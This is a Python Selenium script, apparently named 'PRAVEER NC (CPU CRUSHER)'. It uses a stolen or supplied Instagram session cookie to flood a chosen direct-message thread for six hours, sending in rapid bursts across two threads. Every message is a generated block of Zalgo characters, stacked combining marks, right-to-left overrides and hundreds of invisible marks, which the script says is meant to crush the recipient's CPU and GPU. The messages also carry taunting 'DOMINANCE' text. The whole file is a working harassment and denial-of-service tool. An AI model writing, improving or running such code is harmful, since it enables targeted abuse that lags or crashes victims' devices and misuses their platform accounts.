# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (CPU CRUSHER)
# 📅 STATUS: COMPLEX SCRIPT BLOAT | 2 THREADS | 60s RESTART

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- CPU CRUSHER CONFIG ---
THREADS = 2             
TOTAL_DURATION = 21600  
BURST_SPEED = (0.01, 0.05) 
SESSION_LIMIT = 60 # Ultra-short sessions to prevent self-lag

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()

def get_cpu_crusher_payload(target):
    """Generates text that is computationally expensive to render."""
    # 1. Using Mathematical Alphanumeric Symbols (Heavy for GPU/CPU)
    # These aren't standard fonts; they are complex vector shapes.
    complex_praveer = "𝖯𝖱𝖠𝖵𝖤𝖤𝖱_𝖭𝖢_𝖮𝖶𝖭𝖲_𝖸𝖮𝖴"
    
    # 2. Complex Script Overlay (Combining marks from multiple languages)
    # This forces the browser to check multiple font libraries per character
    combining_chaos = "⃢⃟⃞⃠⃤⃘⃚⃛⃜" 
    
    # 3. Recursive Zalgo Tower (Increased to 50 for max vertical bleed)
    z_tower = "̸" * 50
    
    skyscraper = []
    skyscraper.append(f"🔱 PRAVEER DOMINANCE: {target.upper()} 🔱")
    
    for _ in range(20): # Increased height
        # Mix complex shapes with high-density Zalgo and direction overrides
        line = "".join(c + z_tower + combining_chaos for c in complex_praveer)
        skyscraper.append(line)
        # Adding RTL override mid-block to break the rendering engine's flow
        skyscraper.append("\u202E" + "‎" * 500) 

    return "\n".join(skyscraper)

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new") 
    chrome_options.add_argument("--no-sandbox") 
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    # Disabling font antialiasing forces the CPU to work harder on complex shapes
    chrome_options.add_argument("--disable-font-subpixel-positioning")
    
    temp_dir = os.path.join(tempfile.gettempdir(), f"crusher_{agent_id}_{int(time.time())}")
    chrome_options.add_argument(f"--user-data-dir={temp_dir}")
    return webdriver.Chrome(options=chrome_options)

def adaptive_inject(driver, text):
    try:
        box = driver.find_element(By.XPATH, "//div[@role='textbox']")
        driver.execute_script("""
            var el = arguments[0];
            el.focus();
            document.execCommand('insertText', false, arguments[1]);
            el.dispatchEvent(new Event('input', { bubbles: true }));
        """, box, text)
        box.send_keys(Keys.ENTER)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    global GLOBAL_SENT
    start_time = time.time()
    while (time.time() - start_time) < TOTAL_DURATION:
        driver = None
        session_start = time.time()
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(6)
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(7)

            while (time.time() - session_start) < SESSION_LIMIT:
                payload = get_cpu_crusher_payload(os.getenv("TARGET_NAME", "User"))
                if adaptive_inject(driver, payload):
                    with COUNTER_LOCK:
                        GLOBAL_SENT += 1
                        print(f"[!] CPU IMPACT {GLOBAL_SENT} | MODE: CRUSHER", flush=True)
                time.sleep(random.uniform(*BURST_SPEED))
        except Exception: pass 
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(1)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    raw_url = os.environ.get("GROUP_URL", "").strip()
    target_id = raw_url.split('/')[-2] if '/' in raw_url else raw_url
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS): executor.submit(run_life_cycle, i+1, cookie, target_id)

if __name__ == "__main__":
    main()
